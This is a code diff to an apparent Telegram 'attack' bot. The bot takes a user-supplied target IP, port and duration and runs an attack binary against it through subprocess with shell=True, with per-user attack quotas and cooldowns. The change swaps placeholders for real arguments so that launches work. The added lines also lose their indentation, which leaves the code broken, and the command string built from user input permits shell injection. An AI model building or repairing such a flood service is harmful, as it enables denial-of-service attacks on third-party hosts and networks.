@@ -122,21 +122,23 @@ def handle_attack(message):
     attack_data['last_used'] = now  # Set the cooldown here, before starting the attack
 
     # Execute the attack
-    full_command = f"./{binary} <target_ip> <target_port> <duration>"
-    try:
-        bot.reply_to(
-            message,
-            f"🚀 **Attack Initiated!**\n"
-            f"📍 **Target:** `{target}`\n"
-            f"🔢 **Port:** `{port}`\n"
-            f"⏱ **Duration:** `{time_duration} seconds`\n"
-            f"🧮 **Remaining Attacks:** `{ATTACK_LIMIT - user['attacks'] - 1}`"
-        )
-        subprocess.run(full_command, shell=True)
-        bot.reply_to(message, f"✅ **Attack Completed Successfully!**")
-    except Exception as e:
-        bot.reply_to(message, f"❌ Execution Error: {str(e)}")
-        return
+    # Correct command for executing the attack
+full_command = f"./{binary} {target} {port} {time_duration}"
+
+# Execute the attack
+try:
+    bot.reply_to(
+        message,
+        f"🚀 **Attack Initiated!**\n"
+        f"📍 **Target:** `{target}`\n"
+        f"🔢 **Port:** `{port}`\n"
+        f"⏱ **Duration:** `{time_duration} seconds`\n"
+        f"🧮 **Remaining Attacks:** `{ATTACK_LIMIT - user['attacks'] - 1}`"
+    )
+    subprocess.run(full_command, shell=True, check=True)  # Added check=True to raise exceptions on errors
+    bot.reply_to(message, f"✅ **Attack Completed Successfully!**")
+except subprocess.CalledProcessError as e:
+    bot.reply_to(message, f"❌ Execution Error: {e}")
 
     # Update user data
     user['attacks'] += 1
